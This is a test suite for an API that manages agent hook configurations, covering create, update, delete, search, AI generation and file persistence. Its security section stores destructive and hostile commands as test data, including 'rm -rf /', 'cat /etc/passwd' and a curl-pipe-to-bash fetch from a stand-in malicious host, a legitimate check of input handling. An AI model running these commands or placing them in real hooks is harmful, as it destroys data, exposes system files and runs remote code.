import { describe, test, expect, beforeAll, afterAll } from 'bun:test'
import { createPromptlianoClient } from '@promptliano/api-client'
import type { 
  PromptlianoClient, 
  CreateHookConfigBody, 
  UpdateHookConfigBody, 
  HookEvent,
  HookGenerationRequest,
  HookTestRequest,
  HookListItem
} from '@promptliano/api-client'
import type { TestEnvironment } from './test-environment'
import { withTestEnvironment, checkLMStudioAvailability } from './test-environment'
import { assertions, factories, TestDataManager, withTestData, retryOperation, waitFor, PerformanceTracker } from './utils/test-helpers'
import { mkdirSync, writeFileSync, existsSync, rmSync, readFileSync } from 'fs'
import { join, dirname } from 'path'

/**
 * Comprehensive API tests for Claude Hooks operations
 * Tests hook CRUD, validation, generation, and execution with security considerations
 */
describe('Claude Hooks API Tests', () => {
  
  /**
   * Test helper to create hook configuration files in a test directory
   */
  async function setupHookFiles(testProjectPath: string) {
    const claudeDir = join(testProjectPath, '.claude')
    if (!existsSync(claudeDir)) {
      mkdirSync(claudeDir, { recursive: true })
    }

    // Create a sample hooks.json file with various hook configurations
    const hooksConfig = {
      hooks: {
        PostToolUse: [
          {
            matcher: 'Edit|Write',
            hooks: [
              {
                type: 'command',
                command: 'echo "File modified: $TOOL_NAME"',
                timeout: 30
              },
              {
                type: 'command',
                command: 'npm run lint',
                timeout: 60,
                run_in_background: true
              }
            ]
          },
          {
            matcher: 'MultiEdit',
            hooks: [
              {
                type: 'command',
                command: 'echo "Multiple files edited"',
                timeout: 15
              }
            ]
          }
        ],
        PreToolUse: [
          {
            matcher: 'Bash',
            hooks: [
              {
                type: 'command',
                command: 'echo "About to execute bash command"',
                timeout: 10
              }
            ]
          }
        ],
        UserPromptSubmit: [
          {
            matcher: '.*',
            hooks: [
              {
                type: 'command',
                command: 'echo "User submitted prompt at $(date)"',
                timeout: 5
              }
            ]
          }
        ]
      }
    }

    const hooksFilePath = join(claudeDir, 'hooks.json')
    writeFileSync(hooksFilePath, JSON.stringify(hooksConfig, null, 2))

    return {
      hooksFilePath,
      hooksConfig
    }
  }

  /**
   * Clean up hook files after tests
   */
  async function cleanupHookFiles(testProjectPath: string) {
    const claudeDir = join(testProjectPath, '.claude')
    if (existsSync(claudeDir)) {
      rmSync(claudeDir, { recursive: true, force: true })
    }
  }

  /**
   * Factory for creating test hook data
   */
  const hookFactories = {
    /**
     * Creates valid hook configuration data
     */
    createHookData(overrides: Partial<CreateHookConfigBody> = {}): CreateHookConfigBody {
      const timestamp = Date.now()
      return {
        event: 'PostToolUse',
        matcher: `Test-${timestamp}`,
        command: `echo "Test hook executed at ${new Date().toISOString()}"`,
        timeout: 30,
        ...overrides
      }
    },

    /**
     * Creates hook generation request data
     */
    createGenerationRequest(overrides: Partial<HookGenerationRequest> = {}): HookGenerationRequest {
      return {
        description: 'Run tests after editing source files',
        context: {
          suggestedEvent: 'PostToolUse',
          examples: ['npm test', 'bun test', 'yarn test']
        },
        ...overrides
      }
    },

    /**
     * Creates hook test request data
     */
    createTestRequest(overrides: Partial<HookTestRequest> = {}): HookTestRequest {
      return {
        event: 'PostToolUse',
        matcher: 'Edit',
        command: 'echo "Testing hook"',
        timeout: 10,
        sampleToolName: 'Edit',
        ...overrides
      }
    }
  }

  /**
   * Custom assertions for Claude Hooks
   */
  const hookAssertions = {
    /**
     * Asserts that a hook has the expected structure
     */
    assertValidHook(hook: any): asserts hook is HookListItem {
      expect(hook).toBeDefined()
      expect(typeof hook.event).toBe('string')
      expect(typeof hook.matcherIndex).toBe('number')
      expect(typeof hook.matcher).toBe('string')
      expect(typeof hook.command).toBe('string')
      
      // Validate event is one of the allowed types
      const validEvents: HookEvent[] = [
        'PreToolUse', 'PostToolUse', 'UserPromptSubmit', 
        'Notification', 'Stop', 'SubagentStop', 'SessionStart', 'PreCompact'
      ]
      expect(validEvents).toContain(hook.event as HookEvent)
      
      if (hook.timeout !== undefined) {
        expect(typeof hook.timeout).toBe('number')
        expect(hook.timeout).toBeGreaterThan(0)
      }
    },

    /**
     * Asserts hook list structure
     */
    assertValidHookList(hooks: any): asserts hooks is HookListItem[] {
      expect(Array.isArray(hooks)).toBe(true)
      hooks.forEach((hook: any) => this.assertValidHook(hook))
    },

    /**
     * Asserts hook generation response
     */
    assertValidGenerationResponse(response: any) {
      assertions.assertSuccessResponse(response)
      expect(response.data.event).toBeTypeOf('string')
      expect(response.data.matcher).toBeTypeOf('string')
      expect(response.data.command).toBeTypeOf('string')
      expect(response.data.description).toBeTypeOf('string')
      
      if (response.data.timeout !== undefined) {
        expect(response.data.timeout).toBeTypeOf('number')
      }
      
      if (response.data.security_warnings !== undefined) {
        expect(Array.isArray(response.data.security_warnings)).toBe(true)
      }
    }
  }

  withTestEnvironment('Claude Hooks CRUD Operations', async (testEnv: TestEnvironment) => {
    let client: PromptlianoClient
    let dataManager: TestDataManager
    let testProject: any
    let projectPath: string
    let createdHooks: HookListItem[] = []
    let performanceTracker: PerformanceTracker

    beforeAll(async () => {
      client = createPromptlianoClient({ baseUrl: testEnv.baseUrl })
      dataManager = new TestDataManager(client)
      performanceTracker = new PerformanceTracker()
      
      // Create test project
      testProject = await dataManager.createProject({
        name: 'Claude Hooks Test Project',
        description: 'Test project for Claude Hooks operations',
        path: '/tmp/claude-hooks-test'
      })
      
      projectPath = testProject.path

      // Setup hook files for file-based operations
      await setupHookFiles(projectPath)
    })

    afterAll(async () => {
      // Cleanup created hooks
      for (const hook of createdHooks) {
        try {
          await client.claudeHooks.delete(projectPath, hook.event, hook.matcherIndex)
        } catch (error) {
          // Ignore errors during cleanup
        }
      }
      
      await cleanupHookFiles(projectPath)
      await dataManager.cleanup()
      
      if (testEnv.isLocal) {
        performanceTracker.printSummary()
      }
    })

    describe('Hook List Operations', () => {
      test('should list existing hooks from configuration file', async () => {
        const result = await performanceTracker.measure('list-hooks', async () => {
          return await client.claudeHooks.list(projectPath)
        })
        
        assertions.assertSuccessResponse(result)
        hookAssertions.assertValidHookList(result.data)
        
        // Should have hooks from the setup file
        expect(result.data.length).toBeGreaterThan(0)
        
        // Verify we have hooks from different events
        const events = new Set(result.data.map(hook => hook.event))
        expect(events.has('PostToolUse')).toBe(true)
        expect(events.has('PreToolUse')).toBe(true)
        expect(events.has('UserPromptSubmit')).toBe(true)
      })

      test('should handle empty hooks configuration gracefully', async () => {
        // Create a temporary directory with no hooks
        const emptyProjectPath = '/tmp/empty-hooks-test'
        mkdirSync(emptyProjectPath, { recursive: true })
        
        try {
          const result = await client.claudeHooks.list(emptyProjectPath)
          assertions.assertSuccessResponse(result)
          expect(Array.isArray(result.data)).toBe(true)
          expect(result.data.length).toBe(0)
        } finally {
          rmSync(emptyProjectPath, { recursive: true, force: true })
        }
      })
    })

    describe('Hook CRUD Operations', () => {
      test('should create a new hook successfully', async () => {
        const createData = hookFactories.createHookData({
          event: 'PostToolUse',
          matcher: 'TestCreate',
          command: 'echo "Created hook test"',
          timeout: 45
        })

        const result = await performanceTracker.measure('create-hook', async () => {
          return await client.claudeHooks.create(projectPath, createData)
        })
        
        assertions.assertSuccessResponse(result)
        hookAssertions.assertValidHook(result.data)
        
        expect(result.data.event).toBe(createData.event)
        expect(result.data.matcher).toBe(createData.matcher)
        expect(result.data.command).toBe(createData.command)
        expect(result.data.timeout).toBe(createData.timeout)
        expect(typeof result.data.matcherIndex).toBe('number')
        
        // Track for cleanup
        createdHooks.push(result.data)
      })

      test('should retrieve a specific hook', async () => {
        // Create a hook first
        const createData = hookFactories.createHookData({
          event: 'PreToolUse',
          matcher: 'TestGet',
          command: 'echo "Get hook test"'
        })

        const createResult = await client.claudeHooks.create(projectPath, createData)
        assertions.assertSuccessResponse(createResult)
        createdHooks.push(createResult.data)

        // Now retrieve it
        const result = await performanceTracker.measure('get-hook', async () => {
          return await client.claudeHooks.get(
            projectPath, 
            createResult.data.event, 
            createResult.data.matcherIndex
          )
        })
        
        assertions.assertSuccessResponse(result)
        hookAssertions.assertValidHook(result.data)
        expect(result.data).toEqual(createResult.data)
      })

      test('should update an existing hook', async () => {
        // Create a hook first
        const createData = hookFactories.createHookData({
          event: 'PostToolUse',
          matcher: 'TestUpdate',
          command: 'echo "Original command"',
          timeout: 30
        })

        const createResult = await client.claudeHooks.create(projectPath, createData)
        assertions.assertSuccessResponse(createResult)
        createdHooks.push(createResult.data)

        // Update it
        const updateData: UpdateHookConfigBody = {
          event: 'PostToolUse',
          matcherIndex: createResult.data.matcherIndex,
          command: 'echo "Updated command"',
          timeout: 60
        }

        const result = await performanceTracker.measure('update-hook', async () => {
          return await client.claudeHooks.update(
            projectPath, 
            createResult.data.event, 
            createResult.data.matcherIndex, 
            updateData
          )
        })
        
        assertions.assertSuccessResponse(result)
        hookAssertions.assertValidHook(result.data)
        
        expect(result.data.command).toBe(updateData.command)
        expect(result.data.timeout).toBe(updateData.timeout)
        expect(result.data.matcherIndex).toBe(createResult.data.matcherIndex)
        expect(result.data.event).toBe(createResult.data.event)
      })

      test('should delete a hook successfully', async () => {
        // Create a hook first
        const createData = hookFactories.createHookData({
          event: 'PostToolUse',
          matcher: 'TestDelete',
          command: 'echo "To be deleted"'
        })

        const createResult = await client.claudeHooks.create(projectPath, createData)
        assertions.assertSuccessResponse(createResult)

        // Delete it
        const deleteResult = await performanceTracker.measure('delete-hook', async () => {
          return await client.claudeHooks.delete(
            projectPath, 
            createResult.data.event, 
            createResult.data.matcherIndex
          )
        })
        
        expect(deleteResult).toBe(true)

        // Verify it's gone
        await expect(async () => {
          await client.claudeHooks.get(
            projectPath, 
            createResult.data.event, 
            createResult.data.matcherIndex
          )
        }).toThrow()
      })
    })

    describe('Hook Validation', () => {
      test('should validate hook event types', async () => {
        const invalidEventData = {
          event: 'InvalidEvent' as HookEvent,
          matcher: 'Test',
          command: 'echo "test"'
        }

        await expect(async () => {
          await client.claudeHooks.create(projectPath, invalidEventData)
        }).toThrow()
      })

      test('should validate command is not empty', async () => {
        const emptyCommandData = hookFactories.createHookData({
          command: ''
        })

        await expect(async () => {
          await client.claudeHooks.create(projectPath, emptyCommandData)
        }).toThrow()
      })

      test('should validate matcher is not empty', async () => {
        const emptyMatcherData = hookFactories.createHookData({
          matcher: ''
        })

        await expect(async () => {
          await client.claudeHooks.create(projectPath, emptyMatcherData)
        }).toThrow()
      })

      test('should validate timeout is positive', async () => {
        const negativeTimeoutData = hookFactories.createHookData({
          timeout: -1
        })

        await expect(async () => {
          await client.claudeHooks.create(projectPath, negativeTimeoutData)
        }).toThrow()
      })

      test('should accept all valid hook events', async () => {
        const validEvents: HookEvent[] = [
          'PreToolUse', 'PostToolUse', 'UserPromptSubmit', 
          'Notification', 'Stop', 'SubagentStop', 'SessionStart', 'PreCompact'
        ]

        for (const event of validEvents) {
          const hookData = hookFactories.createHookData({
            event,
            matcher: `Valid-${event}`,
            command: `echo "Testing ${event} event"`
          })

          const result = await client.claudeHooks.create(projectPath, hookData)
          assertions.assertSuccessResponse(result)
          expect(result.data.event).toBe(event)
          
          createdHooks.push(result.data)
        }
      })
    })

    describe('Hook Search Operations', () => {
      test('should search hooks by query', async () => {
        // Create some searchable hooks
        const searchableHooks = [
          hookFactories.createHookData({
            matcher: 'SearchTest1',
            command: 'npm test'
          }),
          hookFactories.createHookData({
            matcher: 'SearchTest2', 
            command: 'npm run lint'
          }),
          hookFactories.createHookData({
            matcher: 'DifferentMatcher',
            command: 'echo "different"'
          })
        ]

        for (const hookData of searchableHooks) {
          const result = await client.claudeHooks.create(projectPath, hookData)
          assertions.assertSuccessResponse(result)
          createdHooks.push(result.data)
        }

        // Search for hooks
        const searchResult = await performanceTracker.measure('search-hooks', async () => {
          return await client.claudeHooks.search(projectPath, 'SearchTest')
        })
        
        assertions.assertSuccessResponse(searchResult)
        hookAssertions.assertValidHookList(searchResult.data)
        
        // Should find at least the hooks we created with SearchTest in the name
        const foundSearchTestHooks = searchResult.data.filter(hook => 
          hook.matcher.includes('SearchTest')
        )
        expect(foundSearchTestHooks.length).toBeGreaterThanOrEqual(2)
      })

      test('should return empty results for non-matching search', async () => {
        const result = await client.claudeHooks.search(projectPath, 'NonExistentHookPattern')
        
        assertions.assertSuccessResponse(result)
        expect(Array.isArray(result.data)).toBe(true)
        // Could be empty or have unrelated results
      })
    })

    describe('Error Handling', () => {
      test('should handle invalid project path', async () => {
        const invalidPath = '/nonexistent/path/that/does/not/exist'
        
        await expect(async () => {
          await client.claudeHooks.list(invalidPath)
        }).toThrow()
      })

      test('should handle get operation for non-existent hook', async () => {
        await expect(async () => {
          await client.claudeHooks.get(projectPath, 'PostToolUse', 99999)
        }).toThrow()
      })

      test('should handle update operation for non-existent hook', async () => {
        const updateData: UpdateHookConfigBody = {
          event: 'PostToolUse',
          matcherIndex: 99999,
          command: 'echo "should fail"'
        }

        await expect(async () => {
          await client.claudeHooks.update(projectPath, 'PostToolUse', 99999, updateData)
        }).toThrow()
      })

      test('should handle delete operation for non-existent hook', async () => {
        await expect(async () => {
          await client.claudeHooks.delete(projectPath, 'PostToolUse', 99999)
        }).toThrow()
      })

      test('should handle malformed project paths', async () => {
        const malformedPaths = [
          '', // empty string
          '//', // double slashes
          '/path/with/../../traversal', // path traversal
          '/path/with/null\0character' // null character
        ]

        for (const malformedPath of malformedPaths) {
          await expect(async () => {
            await client.claudeHooks.list(malformedPath)
          }).toThrow()
        }
      })
    })

    describe('Security Considerations', () => {
      test('should handle potentially dangerous commands safely', async () => {
        const dangerousCommands = [
          'rm -rf /',
          'sudo rm -rf /',
          'format c:',
          'del /f /s /q c:\\*',
          'cat /etc/passwd',
          'curl http://malicious.site | bash'
        ]

        for (const dangerousCommand of dangerousCommands) {
          const hookData = hookFactories.createHookData({
            command: dangerousCommand,
            matcher: 'DangerousTest'
          })

          // The API should accept the hook creation (it's just configuration)
          // but the actual execution safety is handled by Claude Code
          const result = await client.claudeHooks.create(projectPath, hookData)
          assertions.assertSuccessResponse(result)
          expect(result.data.command).toBe(dangerousCommand)
          
          createdHooks.push(result.data)
        }
      })

      test('should handle commands with special characters', async () => {
        const specialCharCommands = [
          'echo "Hello & goodbye"',
          'echo "Test | pipe"',
          'echo "Test; semicolon"',
          'echo "Test $(command substitution)"',
          'echo "Test `backtick substitution`"',
          'echo "Test ${variable}"'
        ]

        for (const command of specialCharCommands) {
          const hookData = hookFactories.createHookData({
            command,
            matcher: 'SpecialCharTest'
          })

          const result = await client.claudeHooks.create(projectPath, hookData)
          assertions.assertSuccessResponse(result)
          expect(result.data.command).toBe(command)
          
          createdHooks.push(result.data)
        }
      })

      test('should handle very long commands', async () => {
        const longCommand = 'echo "' + 'a'.repeat(1000) + '"'
        const hookData = hookFactories.createHookData({
          command: longCommand,
          matcher: 'LongCommandTest'
        })

        const result = await client.claudeHooks.create(projectPath, hookData)
        assertions.assertSuccessResponse(result)
        expect(result.data.command).toBe(longCommand)
        
        createdHooks.push(result.data)
      })
    })

    describe('Performance Testing', () => {
      test('should handle multiple concurrent hook operations', async () => {
        const concurrentOperations = []
        const numberOfOperations = 5

        // Create multiple hooks concurrently
        for (let i = 0; i < numberOfOperations; i++) {
          const hookData = hookFactories.createHookData({
            matcher: `Concurrent-${i}`,
            command: `echo "Concurrent operation ${i}"`
          })

          concurrentOperations.push(
            client.claudeHooks.create(projectPath, hookData)
          )
        }

        const results = await Promise.all(concurrentOperations)
        
        // Verify all operations succeeded
        results.forEach(result => {
          assertions.assertSuccessResponse(result)
          hookAssertions.assertValidHook(result.data)
          createdHooks.push(result.data)
        })

        expect(results.length).toBe(numberOfOperations)
      })

      test('should handle rapid sequential operations', async () => {
        const startTime = performance.now()
        const operations = 10
        
        for (let i = 0; i < operations; i++) {
          const hookData = hookFactories.createHookData({
            matcher: `Sequential-${i}`,
            command: `echo "Sequential operation ${i}"`
          })

          const result = await client.claudeHooks.create(projectPath, hookData)
          assertions.assertSuccessResponse(result)
          createdHooks.push(result.data)
        }
        
        const duration = performance.now() - startTime
        
        // Performance assertion - should complete within reasonable time
        expect(duration).toBeLessThan(10000) // 10 seconds for 10 operations
        
        if (testEnv.isLocal) {
          console.log(`Sequential operations (${operations}) completed in ${duration.toFixed(2)}ms`)
        }
      })
    })
  })

  // AI-powered hook generation tests (conditional based on LMStudio availability)
  withTestEnvironment('Claude Hooks AI Generation', async (testEnv: TestEnvironment) => {
    let client: PromptlianoClient
    let dataManager: TestDataManager
    let testProject: any
    let projectPath: string
    let aiAvailable: boolean

    beforeAll(async () => {
      client = createPromptlianoClient({ baseUrl: testEnv.baseUrl })
      dataManager = new TestDataManager(client)
      
      // Create test project
      testProject = await dataManager.createProject({
        name: 'Claude Hooks AI Test Project',
        description: 'Test project for AI-powered hook generation',
        path: '/tmp/claude-hooks-ai-test'
      })
      
      projectPath = testProject.path

      // Check AI availability
      const lmStudioCheck = await checkLMStudioAvailability(testEnv.config.ai.lmstudio)
      aiAvailable = lmStudioCheck.available
      
      if (!aiAvailable && testEnv.isLocal) {
        console.log(`⏭️  Skipping AI tests: ${lmStudioCheck.message}`)
      }
    })

    afterAll(async () => {
      await dataManager.cleanup()
    })

    test.skipIf(!aiAvailable)('should generate hook configuration from natural language description', async () => {
      const generationRequest = hookFactories.createGenerationRequest({
        description: 'Run TypeScript type checking after editing .ts files',
        context: {
          suggestedEvent: 'PostToolUse',
          examples: ['tsc --noEmit', 'npm run typecheck', 'bun run typecheck']
        }
      })

      const result = await retryOperation(async () => {
        return await client.claudeHooks.generate(projectPath, generationRequest)
      }, {
        maxRetries: 2,
        delay: 3000,
        shouldRetry: (error) => {
          // Retry on timeout or connection errors
          return error.message.includes('timeout') || error.message.includes('ECONNREFUSED')
        }
      })
      
      hookAssertions.assertValidGenerationResponse(result)
      
      // Verify the generated hook makes sense
      expect(result.data.event).toBeTypeOf('string')
      expect(result.data.matcher).toBeTypeOf('string')
      expect(result.data.command).toBeTypeOf('string')
      expect(result.data.description).toBeTypeOf('string')
      
      // For TypeScript type checking, expect reasonable values
      expect(result.data.command.toLowerCase()).toMatch(/tsc|typecheck/)
      expect(result.data.event).toBe('PostToolUse') // Should match suggestion
    }, 45000) // Longer timeout for AI operations

    test.skipIf(!aiAvailable)('should generate hooks with security warnings for dangerous operations', async () => {
      const dangerousRequest = hookFactories.createGenerationRequest({
        description: 'Delete all temporary files and clean up the system',
        context: {
          suggestedEvent: 'SessionStart',
          examples: ['rm -rf /tmp/*', 'del temp files', 'cleanup system']
        }
      })

      const result = await retryOperation(async () => {
        return await client.claudeHooks.generate(projectPath, dangerousRequest)
      }, {
        maxRetries: 2,
        delay: 3000
      })
      
      hookAssertions.assertValidGenerationResponse(result)
      
      // Should include security warnings for potentially dangerous operations
      expect(result.data.security_warnings).toBeDefined()
      expect(Array.isArray(result.data.security_warnings)).toBe(true)
      
      if (result.data.security_warnings && result.data.security_warnings.length > 0) {
        expect(result.data.security_warnings.some(warning => 
          warning.toLowerCase().includes('danger') || 
          warning.toLowerCase().includes('caution') ||
          warning.toLowerCase().includes('risk')
        )).toBe(true)
      }
    }, 45000)

    test.skipIf(!aiAvailable)('should handle invalid generation requests gracefully', async () => {
      const invalidRequest = {
        description: '', // Empty description
        context: {}
      }

      await expect(async () => {
        await client.claudeHooks.generate(projectPath, invalidRequest)
      }).toThrow()
    })
  })

  // Hook testing operations
  withTestEnvironment('Claude Hooks Testing Operations', async (testEnv: TestEnvironment) => {
    let client: PromptlianoClient
    let dataManager: TestDataManager
    let testProject: any
    let projectPath: string

    beforeAll(async () => {
      client = createPromptlianoClient({ baseUrl: testEnv.baseUrl })
      dataManager = new TestDataManager(client)
      
      // Create test project
      testProject = await dataManager.createProject({
        name: 'Claude Hooks Test Operations Project',
        description: 'Test project for hook testing operations',
        path: '/tmp/claude-hooks-test-ops'
      })
      
      projectPath = testProject.path
    })

    afterAll(async () => {
      await dataManager.cleanup()
    })

    test('should test hook configuration', async () => {
      const testRequest = hookFactories.createTestRequest({
        event: 'PostToolUse',
        matcher: 'Edit',
        command: 'echo "Hook test successful"',
        timeout: 15,
        sampleToolName: 'Edit'
      })

      const result = await client.claudeHooks.test(projectPath, testRequest)
      
      assertions.assertSuccessResponse(result)
      expect(result.data.message).toBeTypeOf('string')
      expect(result.data.message.length).toBeGreaterThan(0)
    })

    test('should handle test requests with various tool names', async () => {
      const toolNames = ['Edit', 'Write', 'Bash', 'Read', 'MultiEdit']
      
      for (const toolName of toolNames) {
        const testRequest = hookFactories.createTestRequest({
          matcher: toolName,
          sampleToolName: toolName,
          command: `echo "Testing with ${toolName}"`
        })

        const result = await client.claudeHooks.test(projectPath, testRequest)
        assertions.assertSuccessResponse(result)
        expect(result.data.message).toBeTypeOf('string')
      }
    })

    test('should validate test request parameters', async () => {
      const invalidRequests = [
        { event: '', matcher: 'Test', command: 'echo test' }, // empty event
        { event: 'PostToolUse', matcher: '', command: 'echo test' }, // empty matcher
        { event: 'PostToolUse', matcher: 'Test', command: '' }, // empty command
      ]

      for (const invalidRequest of invalidRequests) {
        await expect(async () => {
          await client.claudeHooks.test(projectPath, invalidRequest as HookTestRequest)
        }).toThrow()
      }
    })
  })

  // File system integration tests
  withTestEnvironment('Claude Hooks File System Integration', async (testEnv: TestEnvironment) => {
    let client: PromptlianoClient
    let dataManager: TestDataManager
    let testProject: any
    let projectPath: string

    beforeAll(async () => {
      client = createPromptlianoClient({ baseUrl: testEnv.baseUrl })
      dataManager = new TestDataManager(client)
      
      // Create test project
      testProject = await dataManager.createProject({
        name: 'Claude Hooks FS Integration Project',
        description: 'Test project for file system integration',
        path: '/tmp/claude-hooks-fs-test'
      })
      
      projectPath = testProject.path
    })

    afterAll(async () => {
      await dataManager.cleanup()
    })

    test('should persist hooks to file system', async () => {
      const hookData = hookFactories.createHookData({
        event: 'PostToolUse',
        matcher: 'FilePersistTest',
        command: 'echo "File system test"',
        timeout: 30
      })

      // Create hook
      const createResult = await client.claudeHooks.create(projectPath, hookData)
      assertions.assertSuccessResponse(createResult)

      // Verify hooks.json file was created/updated
      const hooksFilePath = join(projectPath, '.claude', 'hooks.json')
      expect(existsSync(hooksFilePath)).toBe(true)

      // Read and verify file contents
      const fileContents = readFileSync(hooksFilePath, 'utf-8')
      const parsedHooks = JSON.parse(fileContents)
      
      expect(parsedHooks).toHaveProperty('hooks')
      expect(parsedHooks.hooks).toHaveProperty(hookData.event)
      
      // Find our hook in the file
      const eventHooks = parsedHooks.hooks[hookData.event]
      const foundMatcher = eventHooks.find((matcher: any) => 
        matcher.matcher === hookData.matcher
      )
      expect(foundMatcher).toBeDefined()
      expect(foundMatcher.hooks).toHaveLength(1)
      expect(foundMatcher.hooks[0].command).toBe(hookData.command)

      // Cleanup
      await client.claudeHooks.delete(projectPath, createResult.data.event, createResult.data.matcherIndex)
    })

    test('should handle missing .claude directory gracefully', async () => {
      // Use a project path without .claude directory
      const cleanProjectPath = '/tmp/clean-hooks-test'
      mkdirSync(cleanProjectPath, { recursive: true })

      try {
        const hookData = hookFactories.createHookData({
          event: 'PostToolUse',
          matcher: 'CleanDirTest',
          command: 'echo "Clean directory test"'
        })

        // Should create .claude directory and hooks.json
        const result = await client.claudeHooks.create(cleanProjectPath, hookData)
        assertions.assertSuccessResponse(result)

        // Verify directory and file were created
        const claudeDir = join(cleanProjectPath, '.claude')
        const hooksFile = join(claudeDir, 'hooks.json')
        
        expect(existsSync(claudeDir)).toBe(true)
        expect(existsSync(hooksFile)).toBe(true)

        // Cleanup
        await client.claudeHooks.delete(cleanProjectPath, result.data.event, result.data.matcherIndex)
      } finally {
        rmSync(cleanProjectPath, { recursive: true, force: true })
      }
    })

    test('should handle concurrent file system operations', async () => {
      const concurrentHooks = []
      const numberOfHooks = 3

      // Create multiple hooks that will modify the same file concurrently
      for (let i = 0; i < numberOfHooks; i++) {
        const hookData = hookFactories.createHookData({
          event: 'PostToolUse',
          matcher: `ConcurrentFS-${i}`,
          command: `echo "Concurrent FS test ${i}"`
        })

        concurrentHooks.push(
          client.claudeHooks.create(projectPath, hookData)
        )
      }

      const results = await Promise.all(concurrentHooks)
      
      // Verify all hooks were created
      results.forEach(result => {
        assertions.assertSuccessResponse(result)
      })

      // Verify all hooks are present in the file
      const hooksFilePath = join(projectPath, '.claude', 'hooks.json')
      const fileContents = readFileSync(hooksFilePath, 'utf-8')
      const parsedHooks = JSON.parse(fileContents)
      
      const postToolUseHooks = parsedHooks.hooks.PostToolUse || []
      const concurrentMatchers = postToolUseHooks.filter((matcher: any) => 
        matcher.matcher.startsWith('ConcurrentFS-')
      )
      
      expect(concurrentMatchers.length).toBe(numberOfHooks)

      // Cleanup
      for (const result of results) {
        await client.claudeHooks.delete(projectPath, result.data.event, result.data.matcherIndex)
      }
    })
  })
})